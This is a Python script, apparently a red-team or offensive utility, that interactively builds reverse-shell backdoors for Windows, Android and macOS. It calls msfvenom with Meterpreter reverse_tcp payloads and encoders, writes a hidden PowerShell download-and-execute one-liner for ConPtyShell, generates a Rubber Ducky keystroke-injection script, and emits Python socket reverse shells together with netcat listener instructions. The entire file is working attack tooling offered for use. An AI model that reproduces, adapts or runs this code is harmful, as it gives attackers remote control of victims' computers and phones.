#!/usr/bin/python3

import os
import subprocess
from colorama import Fore, Back, Style

#windows/x64/reverse_tcp exe
def tcpexe():
    subprocess.call(['msfvenom','-p','windows/x64/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'--platform','windows','--arch','x64','-e','x86/shikata_ga_nai','-b','"'+b+'"','-f','exe','-o',o+'.exe'])
#windows/x64/reverse_tcp dll
def tcpdll():
    subprocess.call(['msfvenom','-p','windows/x64/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'--platform','windows','--arch','x64','-e','x86/shikata_ga_nai','-b','"'+b+'"','-f','dll','-o',o+'.dll'])
#windows/x64/reverse_tcp -f raw -o file.bin
def tcpbin():
    subprocess.call(['msfvenom','-p','windows/x64/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'--platform','windows','--arch','x64','-e','x86/shikata_ga_nai','-b','"'+b+'"','-f','raw','-o',o+'.bin'])
#windows/x64/reverse_tcp -f raw -o file.bat
def tcpbat():
    subprocess.call(['msfvenom','-p','windows/x64/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'--platform','windows','--arch','x64','-e','x86/shikata_ga_nai','-b','"'+b+'"','-f','raw','-o',o+'.bat'])
#windows/x64/reverse_tcp -f py -o file.py
def tcppy():
    subprocess.call(['msfvenom','-p','windows/x64/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'--platform','windows','--arch','x64','-o',o+'.py'])

#python/meterpreter/reverse_tcp -f raw -o file.exe
def tcppyexe():
    subprocess.call(['msfvenom','-p','python/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'--platform','python','--arch','python','-f','raw','-o',o+'.exe'])
#python/meterpreter/reverse_tcp -f raw -o file.bin
def tcppybin():
    subprocess.call(['msfvenom','-p','python/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'--platform','python','--arch','python','-f','raw','-o',o+'.bin'])
#python/meterpreter/reverse_tcp -f py -o file.py
def tcpy():
    subprocess.call(['msfvenom','-p','python/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'--platform','python','--arch','python','-o',o+'.py'])
#python/meterpreter/reverse_tcp -f dll -o file.dll
def tcppydll():
    subprocess.call(['msfvenom','-p','python/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'--platform','python','--arch','python','-o',o+'.dll'])
#android/meterpreter/reverse_tcp -f raw -o file.apk
def tcpapk():
    subprocess.call(['msfvenom','-p','android/meterpreter/reverse_tcp','lhost='+lhost,'lport='+lport,'-f','raw','-o',o+'.apk'])

#Powershell Script by antonioCoco.
def pscoco():
    print(Fore.CYAN+Style.BRIGHT+"Create a listener: nc -lnvp", lport,"\nExecute in windows poweshell:\n",cocofile+lhost,lport+virgolette+Style.RESET_ALL)

def srecap(extension,payload,encoder):  #recap info
    print("")
    print(Fore.MAGENTA+Style.BRIGHT+Back.WHITE+"SETTINGS:"+Style.RESET_ALL)
    print(Fore.MAGENTA+Style.BRIGHT+"IP:",lhost)
    print(Fore.MAGENTA+"PORT:",lport)
    print(Fore.MAGENTA+"File name:", o+extension)
    print(Fore.MAGENTA+"Payload:",payload,encoder)
    print(Style.RESET_ALL)
n=(' ') #none
vis="""
Automatic metasploit payloads and revshells.com scripts


[1] WINDOWS
[2] ANDROID android/meterpreter/reverse_tcp
[3] MAC OS revshells.com python3 scripts

"""
print(Fore.CYAN+Style.BRIGHT+vis+Style.RESET_ALL)
os=input((Fore.YELLOW+"Choose Victim OS [1/2/3]: "+Style.RESET_ALL)) #input victim os
if os == '1':


    options="""
    -TCP connection windows/x64/meterpreter/reverse_tcp          
    [1] EXE file                                                
    [2] DLL file                                                 
    [3] BIN file                                                
    [4] BAT file                                            
    [5] PY  file
    
    -TCP connection python/meterpreter/reverse_tcp
    [6] EXE file
    [7] BIN file
    [8] PY  file
    [9] DLL file

    -POWERSHELL reverse shell
    [10] Windows ConPty by antonioCoco (and auto generate ducky script with your IP and PORT)
    """
    e=('|| encoder: x86/shikata_ga_nai') #encoder
    
    b=str("\\x00")
    cocofile=('powershell -nop -w hidden -c "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ')
    virgolette=('"')

#payloads type
    p1=("windows/x64/meterpreter/reverse_tcp")
    p2=("python/meterpreter/reverse_tcp")
    ducky1=("""
    DELAY 400
    GUI r
    DELAY 200
    STRING powershell
    ENTER
    DELAY 1000
    STRING """)
    ducky2=("""
    DELAY 200
    ENTER
    """)

    print(Fore.CYAN+"\nConfigure your IP and PORT\n"+Style.RESET_ALL)
    lhost=str(input((Fore.YELLOW+Style.BRIGHT+"\nSet your IP: "+Style.RESET_ALL)))
    lport=input((Fore.YELLOW+Style.BRIGHT+"Set your PORT: "+Style.RESET_ALL))

    if lport and lhost:
        print(Fore.CYAN+Style.BRIGHT+options+Style.RESET_ALL)

        i=input((Fore.YELLOW+Style.BRIGHT+"\nChoose one payload: "+Style.RESET_ALL))
        
        o=input((Fore.YELLOW+Style.BRIGHT+"\nFile name without extension"+Fore.RED+" [ex: windows_backdoor]: "+Style.RESET_ALL))
        print("")

        if i and o:
            if i=='1':
                srecap(".exe",p1,e)
                tcpexe()
            elif i=='2':
                srecap(".dll",p1,e)
                tcpdll()
            elif i=='3':
                srecap(".bin",p1,e)
                tcpbin()
                print("\n ;) Now check https://github.com/assume-breach/Home-Grown-Red-Team/tree/main/Harriet to convert",o+".bin to an encrypted dll or exe file")
            elif i=='4':
                srecap(".bat",p1,e)
                tcpbat()
            elif i=='5':
                srecap(".py",p1,n)
                tcppy()
            elif i=='6':
                srecap(".exe",p2,n)
                tcppyexe()
            elif i=='7':
                srecap(".bin",p2,n)
                tcppybin()
                print("\n;) Now check 'https://github.com/assume-breach/Home-Grown-Red-Team/tree/main/Harriet' to convert",o+".bin to an encrypted dll or exe file")
            elif i=='8':
                srecap(".py",p2,n)
                tcpy()
            elif i=='9':
                srecap(".dll",p2,n)
                tcppydll()
            elif i=='10':
                srecap(".txt", "Powershell reverse shell by antonioCoco (check his repo)", n)
                pscoco()
                with open(o+'.txt', 'w') as f:
                    f.write(cocofile)
                with open(o+".txt",'a') as f: 
                    f.write(lhost)
                with open(o+".txt",'a') as f:
                    f.write(" ")
                with open(o+".txt",'a') as f:
                    f.write(lport)
                with open(o+".txt",'a') as f:
                    f.write(virgolette)
                print(Fore.GREEN+"\n-- OUTPUT FILE SAVED AS:",o+".txt --"+Style.RESET_ALL)
                dak=input((Fore.YELLOW+Style.BRIGHT+"\nWanna save a ducky script file with this reverse shell settings? [y/n]: "+Style.RESET_ALL))
                if dak=='y' or dak=="yes":
                    with open(o+'_ducky.txt', 'w') as cac:
                        cac.write(ducky1)
                    with open(o+"_ducky.txt", 'a') as cac:
                        cac.write(cocofile)
                    with open(o+"_ducky.txt",'a') as cac:
                        cac.write(lhost)
                    with open(o+"_ducky.txt",'a') as cac:
                        cac.write(" ")
                    with open(o+"_ducky.txt",'a') as cac:
                        cac.write(lport)
                    with open(o+"_ducky.txt",'a') as cac:
                        cac.write(virgolette)
                    with open(o+"_ducky.txt",'a') as cac:
                        cac.write(ducky2)
                    print(Fore.GREEN+Style.BRIGHT+"Success! Ducky script saved as",o+"_ducky.txt"+Style.RESET_ALL)
                if dak=='n' or dak=='no':
                    quit()
            else:
                print(Fore.RED+Style.BRIGHT+"\n[!] ERROR! Try again!"+Style.RESET_ALL)
        else:
            print(Fore.RED+Style.BRIGHT+"\n[!] ERROR: payload or file name error. Try again."+Style.RESET_ALL)
    else:
        print(Fore.RED+Style.BRIGHT+"\n[!] ERROR IN SETTINGS CONFIGURATION: IP, PORT"+Style.RESET_ALL)

if os =='2':
    banner=""" 
    Building malicious APK with msfvenom android/meterpreter/reverse_tcp
    """
    pa="android/meterpreter/reverse_tcp" #payload type

    print(Fore.CYAN+"\nConfigure your IP and PORT\n"+Style.RESET_ALL)
    lhost=str(input((Fore.YELLOW+Style.BRIGHT+"\nSet your IP: "+Style.RESET_ALL)))
    lport=input((Fore.YELLOW+Style.BRIGHT+"Set your PORT: "+Style.RESET_ALL))
    if lport and lhost:
        o=input((Fore.YELLOW+Style.BRIGHT+"\nFile name without extension"+Style.RESET_ALL+Fore.RED+Style.BRIGHT+" [ex: android_backdoor]: "+Style.RESET_ALL))
        print(Fore.BLUE+Style.BRIGHT+banner+Style.RESET_ALL)
        if o:
            srecap(".apk", pa,n)
            tcpapk()
        else:
            print(Fore.RED+Style.BRIGHT+"\n[!] ERROR: name of apk file"+Style.RESET_ALL)
            quit()
    else:
        print(Fore.RED+Style.BRIGHT+"\n[!] ERROR IN SETTINGS CONFIGURATION: IP, PORT"+Style.RESET_ALL)
if os == '3':
    banner=""" \nMAC OS REVERSE SHELL WITH PYTHON3 (from revshells.com)

    [1] MAC python3#1
    [2] MAC python3#2

    'Visit revshells.com for more info and scripts.'
    """
    print(Fore.CYAN+"\nConfigure your IP and PORT\n"+Style.RESET_ALL)
    lhost=str(input((Fore.YELLOW+Style.BRIGHT+"Set your IP: "+Style.RESET_ALL)))
    lport=input((Fore.YELLOW+Style.BRIGHT+"Set your PORT: "+Style.RESET_ALL))
    print(Fore.CYAN+Style.BRIGHT+banner+Style.RESET_ALL)
    i=input((Fore.YELLOW+Style.BRIGHT+"Choose one of the options: "+Style.RESET_ALL))
    o=input((Fore.YELLOW+Style.BRIGHT+"\nFile name without extension"+Style.RESET_ALL+Fore.RED+Style.BRIGHT+" [ex: mac_backdoor]: "+Style.RESET_ALL))

    macpy1='export RHOST="'+lhost+'";export RPORT='+lport+""";python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""
    macpy2= """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("""+'"'+lhost+'"'+','+lport+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' """
    if i and o:
        if i == '1':
            srecap(".txt", "MacOS from revshells.com python3#1", n)
            print(Fore.CYAN+"\nStart listener with netcat: nc -lnvp",lport+Style.RESET_ALL)
            with open(o+'.txt', 'w') as py1:
                py1.write(macpy1)
            print(Fore.GREEN+Style.BRIGHT+"\nSUCCESS! File saved as",o+".txt"+Style.RESET_ALL)
        if i == '2':
            srecap(".txt", "MacOS from revshells.com python3#2", n)
            print(Fore.CYAN+"\nStart listener with netcat: nc -lnvp",lport+Style.RESET_ALL)
            with open(o+'.txt', 'w') as py2:
                py2.write(macpy2)
            print(Fore.GREEN+Style.BRIGHT+"\nSUCCESS! File saved as",o+".txt"+Style.RESET_ALL)
        else:
            print(Fore.RED+"[!] ERROR in settings configuration: IP, PORT or file name."+Style.RESET_ALL)
print(Fore.CYAN+"\nBye bye ;)"+Style.RESET_ALL)
